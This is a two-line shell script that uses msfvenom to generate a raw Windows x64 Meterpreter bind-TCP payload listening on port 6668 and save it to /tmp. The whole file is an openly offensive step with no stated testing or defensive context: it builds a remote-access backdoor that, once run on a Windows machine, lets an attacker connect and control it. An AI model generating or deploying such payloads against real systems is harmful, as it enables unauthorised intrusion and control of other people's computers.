#!/bin/sh
msfvenom -p windows/x64/meterpreter/bind_tcp --platform windows LPORT=6668 -f raw -o /tmp/bind_meterpreter.bin

